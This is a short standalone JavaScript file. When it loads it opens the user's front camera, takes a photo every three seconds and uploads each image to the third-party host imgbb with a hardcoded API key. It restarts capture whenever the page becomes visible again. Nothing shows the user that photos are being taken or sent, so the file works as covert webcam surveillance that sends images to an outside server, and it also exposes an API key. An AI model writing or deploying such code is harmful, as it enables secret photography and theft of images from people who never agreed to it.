let captureInterval;

function startCapturingAndUploading() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // Use front camera
    .then(function(stream) {
        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
        
        function captureAndUpload() {
            imageCapture.takePhoto()
            .then(blob => {
                const formData = new FormData();
                formData.append('image', blob);

                fetch('https://api.imgbb.com/1/upload?key=ca7a0d0b1700a8200b3e891fba03d310', {
                    method: 'POST',
                    body: formData,
                })
                .then(response => response.json())
                .then(data => {
                    if (data.data) {
                        console.log('Upload successful:', data.data.url);
                    } else {
                        console.log('Failed to upload image. Retrying...');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            })
            .catch(error => {
                console.error('Error taking photo:', error);
            });
        }

        captureInterval = setInterval(captureAndUpload, 3000); // Adjust time as needed
    })
    .catch(function(err) {
        console.error('Error accessing the camera: ', err);
    });
}

document.addEventListener("visibilitychange", function() {
    if (document.visibilityState === 'hidden') {
        clearInterval(captureInterval);
    } else {
        startCapturingAndUploading();
    }
});

startCapturingAndUploading(); // Start the process automatically

